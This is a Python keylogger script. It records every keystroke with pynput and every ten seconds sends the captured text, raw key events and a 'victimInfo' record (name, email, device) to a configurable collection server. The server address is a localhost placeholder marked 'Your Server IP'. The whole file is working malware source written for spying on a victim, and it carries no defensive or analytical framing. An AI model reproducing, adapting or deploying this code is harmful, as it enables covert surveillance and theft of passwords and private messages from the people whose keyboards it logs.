from pynput import keyboard
import requests
import threading
import string
import json
import datetime

## to stop the script time of testing
#  taskkill /F /IM python.exe

ip='http://localhost:8000/log' #Your Server IP
time=10 #Time to sent req in sec

log=""
logcon=[]


victimInfo={"ID":"a1","Name":"user","Email":"user@gmail.com","Device":"Windows"} #change according to you


def sendData():
    global log
    global logcon
    try:
        payload = {"Logs": log, "KeysLogs": logcon,"Time":datetime.datetime.now().isoformat()}
        requests.post(
            f'{ip}/user/{victimInfo["ID"]}',
            json.dumps(payload),
            headers={"Content-Type": "application/json"}
        )

        timer = threading.Timer(time, sendData)
        timer.start()

    except Exception as e:
        pass
    
def sendInfo():
    try:
        requests.post(f'{ip}/users',json.dumps(victimInfo),headers={"Content-Type" : "application/json"})
    except:
        pass
    

def onpress(k):
    global log
    global logcon
    try:
        if k== keyboard.Key.enter:
            log += "\n"
        elif k== keyboard.Key.tab:
            log += "\t"
        elif k== keyboard.Key.space:
            log += " "
        elif k== keyboard.Key.shift or k==keyboard.Key.ctrl or k==keyboard.Key.alt:
            pass
        elif k== keyboard.Key.backspace and len(log) > 0:
            log = log[:-1]
        elif k== keyboard.Key.esc:
            return False
        elif str(k).strip("'") in string.ascii_letters+string.digits+string.punctuation:
            log += str(k).strip("'")
        logcon.append(str(k))
    
    except KeyError:
        print(KeyError)
    

sendInfo()
sendData()
with keyboard.Listener(on_press=onpress) as listener:
    listener.join()